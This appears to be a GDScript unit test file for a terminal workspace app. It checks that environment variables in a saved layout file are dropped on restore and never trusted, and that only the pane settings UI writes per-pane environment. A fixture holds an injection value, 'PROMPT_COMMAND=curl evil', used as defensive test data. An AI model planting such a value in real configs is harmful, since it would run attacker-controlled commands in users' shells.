extends GutTest
# User-owned pane environment, end to end. A saved file cannot supply env:
# restore drops one it finds (with a notice naming it, and never adopts it
# into the trusted map), the pane's own env comes from PaneEnvStore at spawn,
# and only the pane settings UI writes that store.

const WorkspaceScript = preload("res://scenes/terminal/workspace.gd")

var _ws: Control

func before_each():
	MockAutoloads.setup()
	SettingsManager.cfg_shell_command = SettingsManager.default_shell_command()
	SettingsManager.cfg_shell_env = "GLOBAL=1"

func after_each():
	if _ws:
		if _ws.get_parent():
			_ws.get_parent().remove_child(_ws)
		_ws.free()
		_ws = null
	MockAutoloads.teardown()

## Restore a single terminal tile with the given settings; return its body.
func _restore_one(settings: Dictionary) -> Control:
	var ws = WorkspaceScript.new()
	_ws = ws
	add_child(ws)
	await get_tree().process_frame
	await get_tree().process_frame
	var tiles: Array[Dictionary] = [{
		"col": 0, "row": 0, "cspan": PaneTypes.GRID, "rspan": PaneTypes.GRID,
		"settings": settings,
	}]
	ws._restore_into(ws._workspaces[0], tiles)
	return ws._tm._find_body(ws._tm.tiles[0].wrapper)

func test_a_saved_file_cannot_supply_env():
	watch_signals(ToastManager)
	var body = await _restore_one({
		"type": "terminal", "pane_name": "Evil", "attachment_id": "evil-pane",
		"shell_env": "PROMPT_COMMAND=curl evil",
	})
	assert_eq(body.shell_env, "GLOBAL=1", "the file's env must not reach the pane")
	assert_eq(PaneEnvStore.env_for("evil-pane"), "",
		"the file's env must not be adopted into the trusted store")
	assert_signal_emitted_with_parameters(ToastManager, "toast_requested", [{
		"text": "Saved pane environment was dropped: Evil: PROMPT_COMMAND=curl evil. Files cannot supply environment — set it again in Pane Settings → Environment.",
		"level": ToastManager.WARN,
		"duration": 8.0,
		"source": "",
	}])

func test_the_users_store_env_applies_at_spawn():
	PaneEnvStore.set_env("my-pane", "OWNED=1\nEDITOR=vim")
	var body = await _restore_one({
		"type": "terminal", "pane_name": "Mine", "attachment_id": "my-pane",
	})
	assert_eq(body.shell_env, "OWNED=1\nEDITOR=vim",
		"the pane's own env overlays the global env at spawn")

func test_saved_layout_state_carries_no_env():
	var ws = WorkspaceScript.new()
	_ws = ws
	add_child(ws)
	await get_tree().process_frame
	await get_tree().process_frame
	var body = ws._tm._find_body(ws._tm.tiles[0].wrapper)
	body.shell_env = "A=1"
	var state: Dictionary = body._get_layout_state()
	assert_false(state.has("shell_env"), "layout state must not carry env into saved files")

func test_the_settings_ui_writes_the_store_and_a_rename_moves_it():
	var ws = WorkspaceScript.new()
	_ws = ws
	add_child(ws)
	await get_tree().process_frame
	await get_tree().process_frame
	var body = ws._tm._find_body(ws._tm.tiles[0].wrapper)
	body.apply_settings({"attachment_id": "old-id"})
	PaneEnvStore.set_env("old-id", "A=1")

	# Exactly what the settings overlay does: gather the fields and apply them.
	var panel = ws._tm._pane_settings_panel
	panel._target = body

	panel._gather_func = func(): return {"shell_env": "B=2\nC=3"}
	panel._apply_to_target()
	assert_eq(PaneEnvStore.env_for("old-id"), "B=2\nC=3", "the settings UI is the store's writer")

	panel._gather_func = func(): return {"attachment_id": "new-id"}
	panel._apply_to_target()
	assert_eq(PaneEnvStore.env_for("new-id"), "B=2\nC=3", "a rename carries the pane's env")
	assert_eq(PaneEnvStore.env_for("old-id"), "", "and the old id keeps nothing")

	panel._gather_func = func(): return {"shell_env": "   "}
	panel._apply_to_target()
	assert_eq(PaneEnvStore.env_for("new-id"), "", "clearing the field removes the override")
